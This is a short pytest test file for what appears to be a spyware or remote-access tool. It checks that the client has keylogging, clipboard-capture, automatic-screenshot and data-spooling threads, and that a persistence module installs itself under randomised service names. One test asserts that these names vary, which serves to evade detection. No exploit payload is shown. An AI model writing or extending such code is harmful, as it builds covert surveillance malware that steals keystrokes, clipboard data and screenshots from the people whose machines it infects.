def test_all_modules_importable():
    import client
    import server
    import persistence
    import spool
    assert hasattr(client, "_compute_backoff_delays")
    assert hasattr(client, "_heartbeat_thread")
    assert hasattr(client, "_keylog_flush_thread")
    assert hasattr(client, "_clipboard_flush_thread")
    assert hasattr(client, "_spool_sender_thread")
    assert hasattr(client, "_screenshot_auto_thread")
    assert hasattr(server, "_watchdog")
    assert hasattr(persistence, "_random_service_name")
    assert hasattr(persistence, "verify")
    assert hasattr(persistence, "install_with_fallback")

def test_spool_roundtrip(tmp_path):
    from spool import Spool
    s = Spool(tmp_path)
    s.push("keylog", {"data": "test integration"})
    items = s.pending()
    assert len(items) == 1
    assert items[0]["payload"]["data"] == "test integration"
    s.ack(items[0]["id"])
    assert s.pending() == []

def test_backoff_sequence():
    from client import _compute_backoff_delays
    delays = _compute_backoff_delays(8)
    assert delays == [1, 2, 4, 8, 16, 32, 60, 60]

def test_random_service_names_unique():
    from persistence import _random_service_name
    names = [_random_service_name() for _ in range(50)]
    unique = set(names)
    assert len(unique) > 10
